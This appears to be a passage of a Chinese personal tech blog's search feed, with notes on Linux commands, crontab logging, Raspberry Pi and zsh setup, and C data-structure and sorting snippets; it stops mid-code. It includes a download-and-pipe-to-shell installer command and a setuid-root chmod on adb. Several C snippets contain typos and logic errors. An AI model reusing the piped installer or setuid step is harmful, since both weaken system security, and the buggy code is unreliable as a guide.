        <content type="html"><![CDATA[<pre><code>操作对象who可是下述字母中的任一个或者它们的组合：　　u 表示“用户（user）”，即文件或目录的所有者。　　g 表示“同组（group）用户”，即与文件属主有相同组ID的所有用户。　　o 表示“其他（others）用户”。　　a 表示“所有（all）用户”。它是系统默认值。操作符号可以是：　　+ 添加某个权限。　　- 取消某个权限。　　= 赋予给定权限并取消其他所有权限（如果有的话）。设置 mode 所表示的权限可用下述字母的任意组合：　　r 可读。　　w 可写。  　x 可执行。　　X 只有目标文件对某些用户是可执行的或该目标文件是目录时才追加x 属性。　　s 在文件执行时把进程的属主或组ID置为该文件的文件属主。      方式“u＋s”设置文件的用户ID位，“g＋s”设置组ID位。　　t 保存程序的文本到交换设备上。　　u 与文件属主拥有一样的权限。　　g 与和文件属主同组的用户拥有一样的权限。　　o 与其他用户拥有一样的权限。文件名：以空格分开的要改变权限的文件列表，支持通配符。</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux crontab.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20crontab/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20crontab/</url>
      
        <content type="html"><![CDATA[<p>参考： <a href="https://www.jianshu.com/p/e9ce1a7e1ed1" target="_blank" rel="noopener">https://www.jianshu.com/p/e9ce1a7e1ed1</a></p><p>error: CRON[8380]: (CRON) info (No MTA installed, discarding output)</p><pre><code>如果crontab任务有想控制台打印信息，那么会发送邮件。这时候如果没有安装邮件服务器会日志报错解决： 在crontab中首行添加：MAILTO=&quot;&quot;   # 可以阻止发送邮件* * * * * task &gt;/dev/null 2&gt;&amp;1   # 任务输出重定向</code></pre><p>crontab日志</p><pre><code>sudo vim /etc/rsyslog.conf1. 找到 cron.*    /var/log/cron.log 这一行，取消注释，保存退出sudo /etc/init.d/rsyslog restart然后可以在  /var/log/cron.log  查看日志信息2. 在 /var/log/syslog 里也能看到 crontab 的日志，即使不开启这个。</code></pre><h3 id="开启crontab日志"><a href="#开启crontab日志" class="headerlink" title="开启crontab日志"></a>开启crontab日志</h3><blockquote><p>crontab默认情况下是不执行开启日志的</p></blockquote><p>步骤</p><ol><li>修改rsyslog服务，将 /etc/rsyslog.d/50-default.conf  文件中的 #cron.* 前的 # 删掉</li><li>重启rsyslog服务： service rsyslog restart</li><li>然后再重启crontab服务： service cron restart</li></ol><p>之后，在这个位置 /var/log/cron.log 就可以查看定时任务的文件日志文件了</p><blockquote><p>查看crontab的状态 </p></blockquote><pre><code>service cron status</code></pre><blockquote><p>查看运行时的日志文件，如果在日志文件中执行一条语句后出现：<br>No MTA installed, discarding output<br>则crontab执行脚本时是不会直接错误的信息输出，而是会以邮件的形式发送到邮箱里，需要邮件服务器了，如果没有安装邮件服务器，它就会报这个错。<br>可以在每条定时脚本后面加入：<br>/dev/null 2 &gt; &amp;1<br>即将所有信息输入到linux系统中的空设备/dev/null中。<br>即可解决No MTA installed, discarding output的问题。</p></blockquote><p>如果两个文件同时存在，那么/etc/cron.allow 优先。<br>如果两个文件都不存在，那么只有超级用户可以安排作业。</p><blockquote><p>ubuntu</p></blockquote><pre><code>$sudo /etc/init.d/cron start$sudo /etc/init.d/cron stop$sudo /etc/init.d/cron restart</code></pre><blockquote><p>参数</p></blockquote><ul><li>/etc/cron.deny: 表示不能使用crontab 命令的用户  </li><li>/etc/cron.allow:  表示能使用crontab 的用户。  </li></ul><pre><code>-u user：用来设定某个用户的crontab服务；file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。文件存放在 /var/spool/cron/crontabs 文件夹下并且以用的的名字命名的文件-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。-i：在删除用户的crontab文件时给确认提示。</code></pre><blockquote><p>crontab的文件格式</p></blockquote><ul><li>第1列分钟0～59</li><li>第2列小时0～23（0表示子夜）</li><li>第3列日1～31</li><li>第4列月1～12</li><li>第5列星期0～7（0和7表示星期天）</li><li>第6列要运行的命令,绝对路径</li></ul><pre><code>*/1 * * * * cmd 表示每隔一分钟*/60  * * * * #每60分钟即每小时执行一次*/105 * * * * #每105分钟执行一次@reboot cmd # 开机执行</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pi 配置中文.md</title>
      <link href="/2019/12/03/deploy/raspberry/pi%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E6%96%87/"/>
      <url>/2019/12/03/deploy/raspberry/pi%20%E9%85%8D%E7%BD%AE%E4%B8%AD%E6%96%87/</url>
      
        <content type="html"><![CDATA[<pre><code class="shell"># pi的配置工具sudo raspi-config# 语言-&gt;时区-&gt;local# 去掉 en_GB.UTF-8 UTF-8# 勾上“en_US.UTF-8 UTF-8”“zh_CN.UTF-8 UTF-8”“zh_CN.GBK GBK”# 下一屏幕默认语言选zh_CN.UTF-8# 之后 下载中文库终端输入：sudo apt-get install ttf-wqy-zenhei# 最多再重启一下</code></pre><p>pi 安装py lxml包</p><pre><code class="shell">apt install libxml2 libxml2-dev libxslt libxslt-dev# 错误： src/lxml/includes/etree_defs.h:14:31: fatal error: libxml/xmlversion.h: No such file or directoryexport C_INCLUDE_PATH=/usr/include/libxml2/</code></pre><pre><code class="shell"># 更换软件源# 默认的软件源速度比较慢，官网有一个镜像列表 http://www.raspbian.org/RaspbianMirrors# 这里推荐中科大的 https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian # 感觉他们的主页做的不错，像有在用心维护的感觉。# 方法如下。# 编辑/etc/apt/sources.list文件。删除原文件所有内容，用以下内容取代deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ jessie main non-free contribdeb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ jessie main non-free contrib</code></pre><pre><code class="shell"># 那个1.0.36版本的，这个版本执行adb install的时候会有执行进度提示。# 地址：  https://github.com/NetEaseGame/AutomatorX/releases/tag/1.0.12# 搞下来之后，把adb放到 /usr/local/bin这个目录下，因为adb运行的时候需要root权限，# 所以需要给这个文件添加一下特权模式，这样普通用户也就可以用了。sudo chown root:root /usr/local/bin/adbsudo chmod 0755 /usr/local/bin/adbsudo chmod +s /usr/local/bin/adb</code></pre>]]></content>
      
      
      <categories>
          
          <category> raspberry </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux 安装zsh.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20%E5%AE%89%E8%A3%85zsh/"/>
      <url>/2019/12/03/deploy/linux/linux%20%E5%AE%89%E8%A3%85zsh/</url>
      
        <content type="html"><![CDATA[<blockquote><p>检测zsh</p></blockquote><pre><code class="shell">zsh --version# 没有的话apt install zsh</code></pre><blockquote><p>on-my-zsh 安装</p></blockquote><p>一、自动安装</p><pre><code class="shell">wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh</code></pre><p>二、手动安装</p><ol><li>克隆仓库</li></ol><pre><code class="shell">git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh</code></pre><ol start="2"><li>创建一个新的zsh配置文件</li></ol><pre><code class="shell">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</code></pre><ol start="4"><li>改变默认的Shell</li></ol><pre><code class="shell">chsh -s /bin/zsh</code></pre><ol start="5"><li>设置</li></ol><pre><code class="shell"># 在 ~/.zshrc 最后添加 .bash_profilesource ~/.bash_profile# 重载配置文件source ~/.zshrc</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pi 查看温度.md</title>
      <link href="/2019/12/03/deploy/raspberry/pi%20%E6%9F%A5%E7%9C%8B%E6%B8%A9%E5%BA%A6/"/>
      <url>/2019/12/03/deploy/raspberry/pi%20%E6%9F%A5%E7%9C%8B%E6%B8%A9%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>方法一</p></blockquote><pre><code class="shell">pi@RaspberryPi:~ $ /opt/vc/bin/vcgencmd measure_temp #temp=51.5&#39;C 1 2 </code></pre><blockquote><p>方法二</p></blockquote><pre><code class="shell">pi@RaspberryPi:~ $ cat /sys/class/thermal/thermal_zone0/temp # 50464 1 2 此处，除以1000，单位是℃。 1</code></pre>]]></content>
      
      
      <categories>
          
          <category> raspberry </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux df.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20df/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20df/</url>
      
        <content type="html"><![CDATA[<blockquote><p>df</p></blockquote><pre><code class="shell"># 可以用来查看分区的文件系统df -T# df命令可以显示目前所有文件系统的可用空间及使用情形，请看下列这个例子：df -h# 查看系统中文件的使用情况df -h# 查看当前目录下各个文件及目录占用空间大小du -sh *</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux tail.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20tail/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20tail/</url>
      
        <content type="html"><![CDATA[<blockquote><p>tail本身的功能是显示文件的后多少行</p></blockquote><pre><code class="shell"># 显示filename后十行tail filename# 显示filename后n行tail -n filename # 通过添加-f选项可以监控文件变化,文件有更新就会打印出来tail -f filename# 而且watch的原理就是重复的执行后面的命令,默认的时间间隔是2秒.如watch -d -n 10 cat /etc/syslog.conf# 每10秒打印一下/etc/syslog.conf文件,-d表示高亮变化的部分# 这两个命令在监控日志文件的时候相当有用,有点注意的是经测试不能在后台运行</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 01背包问题模板.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%2001%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%2001%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<pre><code class="c">//01背包问题模板# include &lt;stdio.h&gt;  # include &lt;stdlib.h&gt;  # include &lt;string.h&gt;  # define max(x,y) x&gt;y?x:y;  int v[1001];//价值  int w[1001];//重量  int dp[1001][1001];  int main()  {      int n,m;      while(scanf(&quot;%d%d&quot;,&amp;m,&amp;n)!=EOF)      {          memset(dp,0,sizeof(dp));//初始化          for(int i=1; i&lt;=n; i++)              scanf(&quot;%d%d&quot;,&amp;w[i],&amp;v[i]);          for(int i=1; i&lt;=n; i++) // 物品数              for(int j=m; j&gt;=w[i]; j--) //放入背包                  dp[i][j]=max(dp[i-1][j],dp[i-1][j-w[i]]+v[i]);// 与前面对比          printf(&quot;%d\n&quot;,dp[n][m]);      }  }  //01背包第K优解问题  struct pack  {      int v;//体积      int w;//价值  }node[length];  for(i = 0;i&lt;n;i++)  {      for(j = v;j&gt;=node[i].v;j--)      {          for(d = 1;d&lt;=k;d++)          {              a[d] = dp[j-node[i].v][d] + node[i].w;              b[d] = dp[j][d];          }          x = y = z = 1;          a[d] = b[d] = -1;          while(z&lt;=k &amp;&amp; (x&lt;=k || y&lt;=k))          {              if(a[x]&gt;b[y])              dp[j][z] = a[x++];              else              dp[j][x] = b[y++];              if(dp[j][z]!=dp[j][z-1])              z++;          }      }  }  //dp[v][k]为第K优解，例题：HDU2639  </code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm list.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20list/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20list/</url>
      
        <content type="html"><![CDATA[<h2 id="List的数组定义"><a href="#List的数组定义" class="headerlink" title="List的数组定义"></a>List的数组定义</h2><pre><code class="c">    //线性表数组定义    typedef struct{        ElementType Data[MAXSIZE];        int Last;    }List;    List L,*PtrL;    //线性表数组建立    List *MakeEmpty(){        List *PtrL;        PtrL = (List *)malloc(sizeof(List));        PtrL-&gt;Last = -1;        return PtrL;    }    //线性表数组查找    int Find(ElementType X,List *PtrL){        int i = 0;        while( i &lt;= PtrL-&gt;Last &amp;&amp; PtrL-&gt;Data[i]!= X ){            i++;        }        if( i &gt; PtrL-Last)            return -1;        else            return i;//这里i返回的是下标    }    //线性表数组插入    //这里的i是第几个元素    void Insert(ElementType X,int i,List *PtrL){        int j;        if(PtrL-Last == MAXSIZE-1){            printf(&quot;表满&quot;);            return;        }        if(i &lt; 1 || PtrL-&gt;Last+2){            printf(&quot;位置不合法&quot;);            return;        }        for(j = PtrL-&gt;Last;j &gt;= i-1;j--){            PtrL-&gt;Data[j+1] = PtrL-&gt;Data[j];        }        PtrL-&gt;Data[i-1] = X;        PtrL-&gt;Last++;        return;    }    //线性表数组删除    //这里的i是第几个元素    void Delete( int i,List *PtrL){        int j;        if( i&lt;1 || i &gt; PtrL-&gt;Last+1){            printf(&quot;不存在第%d个元素&quot;，i);            return;        }        for(j = i;j&lt;=PtrL-&gt;Last;j++){            PtrL-&gt;Data[j-1] = PtrL-&gt;Data[j];        }        PtrL-&gt;Last--;        return;    }</code></pre><h2 id="List的链表定义"><a href="#List的链表定义" class="headerlink" title="List的链表定义"></a>List的链表定义</h2><pre><code class="c">    //线性表链表定义    typedef struct Node {        ElementType Data;        struct Node *Next;    }List;    List L,*PreL;    //线性表链表表长    int Length(List *PreL){        List *p = PreL;        int j = 0;        while(p){            p = p-&gt;Next;            j++;        }        return j;    }    //线性表链表查找    //按序号    List *FindKth(int K,List *PreL){        List *p = PreL;        int i = 1;        while (p!=NULL &amp;&amp; i&lt;K){            p = p-&gt;Next;            i++;        }        if(i==K)return p;        else return NULL;    }    //按值    List *Find(ElementType X,List *PreL){        List *p = PreL;        while (p!=NULL &amp;&amp; p-&gt;Data != X){            p = p-Next;        }        return p;    }    //线性表链表插入    List *Insert(ElementType X,int i,List *PreL){        List *p,*s;        if(i==1){            s = (List *)malloc(sizeof(List));            s-&gt;Data = X;            s-&gt;Nextj = PreL;            return s;        }        p = FindKth(i-1,PreL);//查找第i-1个节点        if(p == NULL){            printf(&quot;参数i错&quot;);            return NULL;        }else{            s = (List *)malloc(sizeof(List));            s-&gt;Data = X;            s-&gt;Next = p-&gt;Next;            p-&gt;Next = s;            return PreL;        }    }    //线性表链表删除    List *Delete(int i,List *PreL){        List *p,*s;        if(i == 1){            s = PreL;            if(PreL!=NULL)                PreL = PreL-&gt;Next;            else                 return NULL;            free(s);            return PreL;        }        p = FindKth(i-1,PreL);        if(p == NULL){            pirntf(&quot;第%d个节点不存在&quot;,i-1);return NULL;        }else if(p-Next == NULL){            pirntf(&quot;第%d个节点不存在&quot;,i);return NULL;        }else{            s = p-Next;            p-Next = s-&gt;Next;            free(s);            return PreL;        }    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm queue.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20queue/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20queue/</url>
      
        <content type="html"><![CDATA[<h2 id="Queue的数组定义"><a href="#Queue的数组定义" class="headerlink" title="Queue的数组定义"></a>Queue的数组定义</h2><pre><code class="c">    //队列  数组实现    #define MaxSize 100    typedef struct {        ElementTyPe Data[MaxSize];        int front;        int rear;    }Queue;    //入队列    void AddQ(Queue *PtrQ,ElementTyPe item){        if((PtrQ-&gt;rear+1) % MaxSize == PtrQ-&gt;front){            printf(&quot;队列满&quot;);            return;        }        PtrQ-&gt;rear = (PtrQ-&gt;rear + 1) % MaxSize;        PtrQ-&gt;Data[PtrQ-&gt;rear] = item;    }    //出队列    ElementTyPe DeleteQ(Queue *PtrQ){        if(PtrQ-&gt;front == PtrQ-rear){            printf(&quot;队列空&quot;);            return ERROR;        }else{            PtrQ-&gt;front = (PtrQ-&gt;front + 1)% MaxSize;            return PtrQ-&gt;Data[PtrQ-&gt;front];        }    }</code></pre><h2 id="Queue的链表定义"><a href="#Queue的链表定义" class="headerlink" title="Queue的链表定义"></a>Queue的链表定义</h2><pre><code class="c">    //链表实现  尾进  头出    typedef struct Node{        ElementTyPe Data;        struct Node *Next;    }QNode;    typedef struct{        QNode *front;//指向对头        QNode *rear;//指向队尾    }LinkQueue;    LinkQueue *PtrQ;    //不带头结点的链式队列出队操作的示例    ElementTyPe DeleteQ( LinkQueue *PtrQ){        QNode *FrontCell;        ElementTyPe FrontElem;        if(PtrQ-&gt;front == NULL){            printf(&quot;队列空&quot;)；            return ERROR;        }        FrontCell = PtrQ-&gt;front;        if(PtrQ-&gt;front == PtrQ-&gt;rear)            PtrQ-&gt;front = PtrQ-&gt;rear = NULL;        else {            PtrQ-&gt;front = PtrQ-&gt;front-&gt;Next;        }        FrontElem = FrontCell-&gt;Data;        free(FrontCell);        return FrontElem;    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm stack.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20stack/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20stack/</url>
      
        <content type="html"><![CDATA[<h2 id="用数组来完成堆栈"><a href="#用数组来完成堆栈" class="headerlink" title="用数组来完成堆栈"></a>用数组来完成堆栈</h2><pre><code class="c">    #define MaxSize 30    typedef struct {        ElementType Data[MaxSize];        int Top;    }Stack;        //判断是否已满及压入    void Push(Stack *PtrS, ElementType item){        if(PtrS-&gt;Top == MaxSize-1){            printf(&quot;堆栈满&quot;);            return;        }else {            PtrS-&gt;Data[++(PtrS-&gt;Top)] = item;            return;        }    }        //判断是否为空及出栈    ElementType Pop(Stack *PtrS){        if(PtrS-&gt;Top == -1){            printf(&quot;堆栈空&quot;);            return ERROR;        }else{            return PtrS-&gt;Data[(PtrS-&gt;Top)--];        }    }</code></pre><h2 id="一个数组实现两个堆栈"><a href="#一个数组实现两个堆栈" class="headerlink" title="一个数组实现两个堆栈"></a>一个数组实现两个堆栈</h2><pre><code class="c">    #define MaxSize 30    struct DStack {        ElementType Data[MaxSize];        int Top1;        int Top2;    }S;    S.Top1 = -1;    S.Top2 = MaxSize;        //判断是否已满及压入    void Push (struct DStack *PtrS, ElementType item, int Tag){        if(PtrS-&gt;Top2 - PtrS-&gt;Top1 == 1){            printf(&quot;堆栈满&quot;);            return;        }        if(Tag == 1){            PtrS-&gt;Data[++PtrS-&gt;Top1] = item;        }else{            PtrS-&gt;Data[--(PtrS-&gt;Top2)] = item;        }    }        //判断是否为空及出栈    ElementType Pop (struct DStack *PtrS, int Tag){        if( Tag == 1){            if(PtrS-&gt;Top1 == -1){                printf(&quot;堆栈空&quot;);                return NULL;            }else{                return PtrS-&gt;Data[(PtrS-&gt;Top1)--];            }        }else{            if(PtrS-&gt;Top2 == MaxSize){                printf(&quot;堆栈空&quot;);                return NULL;            }else{                return PtrS-&gt;Data[(PtrS-&gt;Top2)++];            }        }    }</code></pre><h2 id="堆栈的链式存储实现"><a href="#堆栈的链式存储实现" class="headerlink" title="堆栈的链式存储实现"></a>堆栈的链式存储实现</h2><pre><code class="c">    typedef struct Node {        ElementType Element;        struct Node *Next;    }LinkStack;    LinkStack *Top;        //构建一个堆栈的头结点，返回指针    LinkStack *CreateStack(){        LinkStack *S;        S = (LinkStack *)malloc(sizeof(struct Node));        S-&gt;Next = NULL;        return S;    }        //判断堆栈S是否为空，空返回1，否则返回0    int IsEmpty(LinkStack *S){        return S-&gt;Next == NULL;    }        //将元素压入堆栈    void Push (ElementType item,LinkStack *S){        struct Node *TmpCell;        TmpCell = (LinkStack *)malloc(sizeof(struct Node));        TmpCell-&gt;Element = item;        TmpCell-&gt;Next = S-&gt;Next;        S-&gt;Next = TmpCell;    }        //删除并返回堆栈的栈顶元素    ElementType Pop (LinkStack *S){        struct Node *FirstCell;        ElementType Topeleml;        if(IsEmpty(S)){            printf(&quot;堆栈空&quot;);            return NULL;        }else{            FirstCell = S-&gt;Next;            S-&gt;Next = FirstCell-&gt;Next;            TopElem = FirstCell-&gt;Element;            free(FirstCell);            return TopElem;        }    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 二叉搜索树.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉搜索树的查找操作（尾递归）"><a href="#二叉搜索树的查找操作（尾递归）" class="headerlink" title="二叉搜索树的查找操作（尾递归）"></a>二叉搜索树的查找操作（尾递归）</h2><pre><code class="c">    Position find (ElementType X,BinTree BST)    {        if(!BST)            return NULL;        if(X &gt; BST-&gt;Data)            return Find(X,BST-&gt;Right);        else if (X &lt; BST-&gt;Data)            return find(X,BST-&gt;Left);        else            return BST;    }</code></pre><h2 id="二叉搜索树的查找操作（尾递归）改写成迭代函-效率更高"><a href="#二叉搜索树的查找操作（尾递归）改写成迭代函-效率更高" class="headerlink" title="二叉搜索树的查找操作（尾递归）改写成迭代函(效率更高)"></a>二叉搜索树的查找操作（尾递归）改写成迭代函(效率更高)</h2><pre><code class="c">    Position Iterfind (ElementType X,BinTree BST)    {        while(BST)        {        if(X &gt; BST-&gt;Data)            BST = BST-&gt;Right;        else if (X &lt; BST-&gt;Data)            BST = BST-&gt;Left;        else            return BST;        }    }</code></pre><h2 id="二叉搜索树查找最小元素"><a href="#二叉搜索树查找最小元素" class="headerlink" title="二叉搜索树查找最小元素"></a>二叉搜索树查找最小元素</h2><pre><code class="c">    Position FindMin (BinTree BST)    {        if(!BST)            return NULL;        else if(!BST-&gt;Left)            return BST;        else            return FindMin (BST-&gt;Left);    }</code></pre><h2 id="二叉搜索树查找最大元素"><a href="#二叉搜索树查找最大元素" class="headerlink" title="二叉搜索树查找最大元素"></a>二叉搜索树查找最大元素</h2><pre><code class="c">    Position FindMan (BinTree BST)    {        if(BST)            while (BST-&gt;Right)                 BST = BST-&gt;Right;        return BST;    }</code></pre><h2 id="二叉搜索树的插入算法"><a href="#二叉搜索树的插入算法" class="headerlink" title="二叉搜索树的插入算法"></a>二叉搜索树的插入算法</h2><pre><code class="c">    BinTree Insert (ElementType X,BinTree BST)    {        if(!BST)        {            BST = malloc(sizeof(struct TreeNode));            BST-&gt;Data = X;            BST-&gt;Left = BST-&gt;Right = NULL;        } else         {            if(X &lt; BST-&gt;Data)                BST-&gt;Left = Insert(X,BST-&gt;Left);            else if(X&gt;BST-&gt;Data)                BST-&gt;Right = Insert(X,BST-&gt;Right);        }        return BST;    }</code></pre><h2 id="二叉搜索树的删除算法"><a href="#二叉搜索树的删除算法" class="headerlink" title="二叉搜索树的删除算法"></a>二叉搜索树的删除算法</h2><pre><code class="c">    BinTree Delete (ElementType X,BinTree BST)    {        Position Tmp;        if(!BST)            printf(&quot;要删除的元素为找到&quot;);        else if (x&lt;BST-&gt;Data)            BST-&gt;Left = Delete(X,BST-&gt;Left);        else if (x&gt;BST-&gt;Data)            BST-&gt;Right = Delete(X,BST-&gt;Right);        else        {            if(BST-&gt;Left &amp;&amp; BST-&gt;Right)//有左右子树            {                Tmp = FindMin (BST-&gt;Right);                BST-&gt;Data = Tmp-&gt;Data;                BST-&gt;Right = Delete(BST-&gt;Data,BST-&gt;Right);            } else {                Tmp = BST;                if(!BST-&gt;Left)                    BST = BST-&gt;Right;                else if( !BST-&gt;Right)                    BST = BST-&gt;Left;                free(Tmp);            }        }        return BST;    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 各种排序算法.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E5%90%84%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E5%90%84%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><pre><code class="c">    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    void xuanze (int a[],int n)    {        for(int i=0;i&lt;n-1;i++)        {            int min=i;            for(int j=i+1;j&lt;n;j++)            {                if(a[j]&lt;a[min])                {                    min=j;                }            }            if(i!=min)            {                int temp=a[i];                a[i]= a[min];                a[min] = temp;            }        }    }</code></pre><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><pre><code class="c">    #include&lt;stdio.h&gt;    void shift(int a[] , int i , int m)    {        int k , t;        t = a[i]; k = 2 * i + 1;        while (k &lt; m)        {            if ((k &lt; m - 1) &amp;&amp; (a[k] &lt; a[k+1])) k ++;            if (t &lt; a[k]) {a[i] = a[k]; i = k; k = 2 * i + 1;}            else break;         }        a[i] = t;    }    void dui(int a[] , int n)  //a 为排序数组，n为数组大小（编号0-n-1）    {        int i , k;        for (i = n/2-1; i &gt;= 0; i --)            shift(a , i , n);        for (i = n-1; i &gt;= 1; i --)        {             k = a[0]; a[0] = a[i]; a[i] = k;             shift(a , 0 , i);        }    }</code></pre><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><pre><code class="c">    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    void maopao(int a[],int n)    {        for(int i=0;i&lt;n-1;i++)        {            for(int j=0;j&lt;n-i-1;j++)            {                if(a[j]&gt;a[j+1])                {                    int temp = a[j];                    a[j] = a[j+1];                    a[j+1] = temp;                }            }        }    }    void maopaobetter(int a[],int n)    {        for(int i=0;i&lt;n-1;i++)        {            bool isSort = true;            for(int j=0;i&lt;n-1-i;j++)            {                if(a[j]&gt;a[j+1])                {                    isSort = false;                    int temp = a[j];                    a[j] = a[j+1];                    a[j+1] = temp;                }            }            if(isSort) break;        }    }</code></pre><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><pre><code class="c">    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    int partition(int arr[],int low,int high)    {        int key;        key = arr[low];        while(low&lt;high)        {            while(low&lt;high &amp;&amp; arr[high]&gt;=key)                high--;            if(low&lt;high)                arr[low++] = arr[high];            while(low&lt;high &amp;&amp; arr[low]&lt;=key)                low++;            if(low&lt;high)                arr[high--] = arr[low];        }        arr[low] = key;        return low;    }    void kuaisu(int arr[],int start,int end)    {        int pos;        if(start &lt; end)        {            pos = partition(arr,start,end);            kuaisu(arr,start,pos-1);            kuaisu(arr,pos+1,end);        }    }</code></pre><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><pre><code class="c">    #include&lt;stdio.h&gt;    #include&lt;math.h&gt;    //根据当前增量进行插入排序    void shellInsert(int array[],int n,int dk)    {        int i,j,temp;        for(i=dk;i&lt;n;i++)//分别向每组的有序区域插入        {            temp=array[i];            for(j=i-dk;(j&gt;=i%dk)&amp;&amp;array[j]&gt;temp;j-=dk)//比较与记录后移同时进行                array[j+dk]=array[j];            if(j!=i-dk)                array[j+dk]=temp;//插入        }    }    //计算Hibbard增量    int dkHibbard(int t,int k)    {        return int(pow(2,t-k+1)-1);    }    //希尔排序    void xier(int array[],int n,int t)    {        void shellInsert(int array[],int n,int dk);        int i;        for(i=1;i&lt;=t;i++)            shellInsert(array,n,dkHibbard(t,i));    }    //此写法便于理解，实际应用时应将上述三个函数写成一个函数。</code></pre><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><pre><code class="c">    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    void xuanze (int a[],int n)    {        for(int i=0;i&lt;n-1;i++)        {            int min=i;            for(int j=i+1;j&lt;n;j++)            {                if(a[j]&lt;a[min])                {                    min=j;                }            }            if(i!=min)            {                int temp=a[i];                a[i]= a[min];                a[min] = temp;            }        }    }</code></pre><h2 id="各排序算法比较"><a href="#各排序算法比较" class="headerlink" title="各排序算法比较"></a>各排序算法比较</h2><pre><code class="c">    #include&lt;stdlib.h&gt;    #include&lt;stdio.h&gt;    #include&lt;math.h&gt;    #include&lt;time.h&gt;/*用到了time函数，所以要有这个头文件*/    #include&quot;maopao.cpp&quot;    #include&quot;charu.cpp&quot;    #include&quot;xuanze.cpp&quot;    #include&quot;kuaisu.cpp&quot;    #include&quot;xier.cpp&quot;    #define MAX 100000    #include&quot;dui.cpp&quot;    void print(int num[])    {        int i;        for(i=0;i&lt;MAX;i++)            printf(&quot;%d &quot;,num[i]);        printf(&quot;\n&quot;);    }    void suiji(int num[])    {        int i;        srand((unsigned)time(NULL));/*播种子*/        for(i = 0; i &lt; MAX; i++)        {            num[i] = rand() % MAX;/*产生100以内的随机整数*/            //printf(&quot;%d &quot;,num[i]);        }        printf(&quot;\n&quot;);    }    int 